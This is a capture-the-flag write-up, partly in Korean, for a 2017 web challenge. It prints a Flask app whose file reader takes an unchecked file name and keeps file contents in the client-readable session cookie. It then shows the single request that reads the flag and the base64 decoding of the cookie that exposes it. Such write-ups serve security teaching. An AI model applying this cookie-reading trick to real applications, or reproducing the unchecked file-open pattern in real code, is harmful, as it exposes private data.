# [2017_BOB] \[WEB] Web File Reader

###Problem

```python
#!/usr/bin/python
# -*- coding: utf-8 -*-
from flask import *
import os
import hashlib

app = Flask(__name__)

app.secret_key = '#############################'

def check_is_flag(data):
    data = hashlib.sha256(data).hexdigest()

    if data == "c3065ded789a1f36072cd8d03b2c4626e3835419971078108e1f138396432d82":
        return 1
    return 0


@app.route('/')
def main():
    session.clear()
    lists = os.listdir('./files')
    return render_template('main.html', files=lists)

@app.route('/readFile', methods = ['GET'])
def openFile():
    fileName = request.args.get('fileName')

    if session.get('fileFlag') == True:
        session.pop('fileData', None)
    session['fileFlag'] = True
    with open("files/" + fileName ,"r") as f:
        datas = f.readlines()
        data = "\n".join(i for i in datas)
    session['fileData'] = data

    return redirect('/checkFlag')

@app.route('/checkFlag')
def checkIsFlag():
    data = session['fileData']
    session['flagChecked'] = True
    if check_is_flag(data) == 1:
        session['flagChecked'] = False
        session['fileFlag'] = False
        session.pop('fileData', None)
        return "You Cannot Open flag ^~^"
    return redirect('/result')

@app.route('/result')
def res():
    if session.get('fileFlag') != True:
        return "File Already Closed"
    if session.get('flagChecked') != True:
        return "Check your data first"
    data = session['fileData']
    session['fileFlag'] = False
    session['flagChecked'] = False
    session.pop('fileData', None)
    return data


if __name__ == "__main__":
    app.run(host='0.0.0.0', port=8080)
```

문제에서 주어진 Flask 소스코드를 확인했습니다. readFile을 통해 flag를 읽어오는 것이 가능해보입니다.



### Solution

```
Anti-Vulnerability:~ DelspoN$ http GET http://110.34.64.129:7979/readFile?fileName=flag
HTTP/1.0 302 FOUND
Content-Length: 227
Content-Type: text/html; charset=utf-8
Date: Sat, 19 Aug 2017 09:35:27 GMT
Location: http://110.34.64.129:7979/checkFlag
Server: Werkzeug/0.12.2 Python/2.7.12
Set-Cookie: session=eyJmaWxlRGF0YSI6eyIgYiI6IlpteGhaM3R3UURVMWR6QnlZMnhmYkhOZk5UTkRVak5VZlFvPSJ9LCJmaWxlRmxhZyI6dHJ1ZX0.DHmX3w.C_JdoS2Kl6l0srxGKglgoKaeKwE; HttpOnly; Path=/

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to target URL: <a href="/checkFlag">/checkFlag</a>.  If not click the link.
```

session에 값이 저장되어 있습니다.

base64 decode 결과 : `{"fileData":{" b":"ZmxhZ3twQDU1dzByY2xfbHNfNTNDUjNUfQo="},"fileFlag":true}`

1번 더 decode한 결과 : `flag{p@55w0rcl_ls_53CR3T}`